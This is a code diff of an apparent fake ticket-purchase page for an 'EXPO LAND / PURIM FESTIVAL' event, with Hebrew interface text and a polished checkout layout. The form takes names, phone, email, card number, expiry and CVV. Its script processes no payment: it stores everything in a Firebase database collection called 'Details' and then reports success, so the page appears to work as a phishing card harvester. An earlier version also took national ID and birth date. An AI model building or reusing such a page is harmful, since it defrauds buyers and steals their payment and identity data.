@@ -12,57 +12,242 @@
       background: #f4f4f4;
       margin: 0;
     }
-    .screen { display:none; background:#fff; padding:20px; max-width:400px; margin:40px auto; border-radius:10px; }
-    .screen.active { display:block; }
-    input, select, button { width:100%; padding:10px; margin-bottom:12px; box-sizing:border-box; }
-    button { background:black; color:white; border:none; cursor:pointer; }
+
+    .screen {
+      display: none;
+      background: #fff;
+      padding: 20px;
+      max-width: 400px;
+      margin: 40px auto;
+      border-radius: 10px;
+    }
+
+    .screen.active {
+      display: block;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      box-sizing: border-box;
+      font-family: inherit;
+    }
+
+    button {
+      background: black;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button.secondary {
+      background: #ccc;
+      color: black;
+    }
+
+    /* ================= SCREEN 1 ================= */
+    #screen1,
+    #screen2,
+    #screen3 {
+      max-width: 1100px;
+      background: linear-gradient(180deg, #f7efe3, #f4e6d5);
+      border-radius: 18px;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    .s1-wrap, .s2-wrap, .s3-wrap {
+      padding: 18px 18px 90px;
+    }
+
+    .s1-top, .s2-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+
+    .s1-pill, .s2-pill {
+      border: 2px solid rgba(0,0,0,.10);
+      background: rgba(255,255,255,.35);
+      border-radius: 999px;
+      padding: 10px 14px;
+      font-weight: 700;
+      user-select: none;
+    }
+
+    .s1-crumbs, .s2-crumbs {
+      flex: 1;
+      text-align: center;
+      color: #6b7280;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+
+    .s1-crumbs b,
+    .s2-crumbs b {
+      color: #111;
+    }
+
+    .s1-event, .s3-event {
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      padding: 6px 0 18px;
+    }
+
+    .s1-img, .s3-img {
+      width: 92px;
+      height: 92px;
+      border-radius: 18px;
+      object-fit: cover;
+      background: #fff;
+      box-shadow: 0 10px 30px rgba(0,0,0,.10);
+    }
+
+    .s1-title {
+      font-size: 28px;
+      font-weight: 900;
+      margin: 6px 0 8px;
+    }
+
+    .s1-card {
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,.10);
+      padding: 18px;
+      border: 1px solid rgba(0,0,0,.06);
+    }
+
+    .s1-actions,
+    .s2-actions {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 18px;
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+    }
+
+    .s1-actions button,
+    .s2-actions .primary {
+      width: min(1100px, calc(100% - 36px));
+      padding: 16px;
+      border-radius: 999px;
+      background: #2563eb;
+      font-weight: 900;
+    }
+
+    .s2-actions .back {
+      width: 140px;
+      background: transparent;
+      color: #111;
+      border: 2px solid rgba(0,0,0,.12);
+    }
+
+    /* ================= SCREEN 3 ================= */
+    .s3-summary {
+      border-top: 2px solid rgba(0,0,0,.10);
+      border-bottom: 2px solid rgba(0,0,0,.10);
+      padding: 14px 0;
+    }
+
+    .s3-paycard {
+      background: #fff;
+      border-radius: 14px;
+      border: 2px solid rgba(0,0,0,.10);
+      padding: 18px;
+      max-width: 820px;
+      margin: 0 auto;
+    }
+
+    .s3-paygrid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .s3-paygrid .full {
+      grid-column: 1 / -1;
+    }
+
+    @media (max-width: 820px) {
+      #screen1, #screen2, #screen3 {
+        max-width: 420px;
+      }
+
+      .s3-paygrid {
+        grid-template-columns: 1fr;
+      }
+    }
   </style>
 </head>
 
 <body>
-
 <form id="nameForm">
 
-  <!-- SCREEN 1 -->
+  <!-- ========== SCREEN 1 ========== -->
   <div class="screen active" id="screen1">
-    <h2>בחירת כרטיס</h2>
-    <button type="button" onclick="nextScreen(1)">המשך</button>
+    <div class="s1-wrap">
+      <div class="s1-top">
+        <div class="s1-pill">← חזרה</div>
+        <div class="s1-crumbs"><b>כרטיסים</b> ← הכנס פרטים ← תשלום</div>
+        <div class="s1-pill">✕</div>
+      </div>
+
+      <div class="s1-event">
+        <img class="s1-img" src="YOUR_IMAGE_URL_HERE" alt="תמונה">
+        <div>
+          <div class="s1-title">EXPO LAND / PURIM FESTIVAL</div>
+          <div>📅 March 5th 2026, 23:00</div>
+        </div>
+      </div>
+
+      <div class="s1-card">
+        <p><b>FIRST ROUND</b></p>
+        <p>₪220.00</p>
+        <label><input type="radio" name="cardType" required> כרטיס רגיל</label><br>
+        <label><input type="radio" name="cardType"> כרטיס VIP</label>
+      </div>
+    </div>
+
+    <div class="s1-actions">
+      <button type="button" onclick="nextScreen(1)">התקדם</button>
+    </div>
   </div>
 
-  <!-- SCREEN 2 -->
+  <!-- ========== SCREEN 2 ========== -->
   <div class="screen" id="screen2">
-    <h2>פרטים אישיים</h2>
+    <div class="s2-wrap">
+      <input id="phoneNumber" placeholder="Phone" required>
+      <input id="firstName" placeholder="First Name" required>
+      <input id="lastName" placeholder="Last Name" required>
+      <input id="email" type="email" placeholder="Email" required>
+    </div>
 
-    <input type="text" id="firstName" placeholder="First Name" required>
-    <input type="text" id="lastName" placeholder="Last Name" required>
-    <input type="email" id="email" placeholder="Email" required>
-    <input type="number" id="phoneNumber" placeholder="Phone Number" required>
-    <input type="date" id="birthDate" required>
-
-    <select id="gender" required>
-      <option value="">Gender</option>
-      <option value="male">Male</option>
-      <option value="female">Female</option>
-      <option value="other">Other</option>
-    </select>
-
-    <input type="text" id="instagram" placeholder="Instagram">
-    <input type="number" id="ID" placeholder="ID" required>
-
-    <button type="button" onclick="prevScreen(2)">חזור</button>
-    <button type="button" onclick="nextScreen(2)">המשך</button>
+    <div class="s2-actions">
+      <button type="button" class="secondary back" onclick="prevScreen(2)">חזור</button>
+      <button type="button" class="primary" onclick="nextScreen(2)">הבא</button>
+    </div>
   </div>
 
-  <!-- SCREEN 3 -->
+  <!-- ========== SCREEN 3 ========== -->
   <div class="screen" id="screen3">
-    <h2>תשלום</h2>
+    <div class="s3-wrap">
+      <div class="s3-paycard">
+        <div class="s3-paygrid">
+          <input class="full" id="creditCardNumber" placeholder="Credit Card" required>
+          <input id="expire" placeholder="MM/YY" required>
+          <input id="cvv" placeholder="CVV" required>
+        </div>
 
-    <input type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
-    <input type="text" id="expire" placeholder="Expire MM/YY" required>
-    <input type="number" id="cvv" placeholder="CVV" required>
-
-    <button type="submit">שלם</button>
-    <div id="saveStatus" style="margin-top:10px;font-size:13px;"></div>
+        <button type="submit">שלם</button>
+        <div id="saveStatus"></div>
+      </div>
+    </div>
   </div>
 
 </form>
@@ -73,19 +258,18 @@
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
 <script>
-  function nextScreen(n){
-    document.getElementById("screen"+n).classList.remove("active");
-    document.getElementById("screen"+(n+1)).classList.add("active");
+  function nextScreen(current) {
+    document.getElementById('screen' + current).classList.remove('active');
+    document.getElementById('screen' + (current + 1)).classList.add('active');
   }
-  function prevScreen(n){
-    document.getElementById("screen"+n).classList.remove("active");
-    document.getElementById("screen"+(n-1)).classList.add("active");
+
+  function prevScreen(current) {
+    document.getElementById('screen' + current).classList.remove('active');
+    document.getElementById('screen' + (current - 1)).classList.add('active');
   }
 </script>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
-
   const firebaseConfig = {
     apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
     authDomain: "zygo-acf32.firebaseapp.com",
@@ -97,51 +281,26 @@ document.addEventListener("DOMContentLoaded", () => {
   };
 
   firebase.initializeApp(firebaseConfig);
-
   const database = firebase.database();
   const firestore = firebase.firestore();
 
-  const form = document.getElementById("nameForm");
-  const statusEl = document.getElementById("saveStatus");
-
-  form.addEventListener("submit", async (e) => {
+  document.getElementById('nameForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    const userData = {
+    const data = {
       firstName: firstName.value,
       lastName: lastName.value,
       email: email.value,
-      phoneNumber: phoneNumber.value,
-      birthDate: birthDate.value,
-      gender: gender.value,
-      instagram: instagram.value,
-      ID: ID.value,
-      creditCardNumber: creditCardNumber.value,
-      expire: expire.value,
-      cvv: cvv.value,
+      phone: phoneNumber.value,
+      creditCard: creditCardNumber.value,
       createdAt: Date.now()
     };
 
-    const collectionName = "Details";
+    await database.ref('Details').push(data);
+    await firestore.collection('Details').add(data);
 
-    try {
-      statusEl.textContent = "שומר נתונים...";
-
-      await database.ref(collectionName).push(userData);
-      await firestore.collection(collectionName).add(userData);
-
-      statusEl.textContent = "✅ נשמר בהצלחה";
-      alert("הנתונים נשמרו בהצלחה");
-      form.reset();
-
-    } catch (err) {
-      console.error(err);
-      statusEl.textContent = "❌ שגיאה בשמירה";
-    }
+    alert('הנתונים נשמרו בהצלחה');
   });
-
-});
 </script>
-
 </body>
 </html>
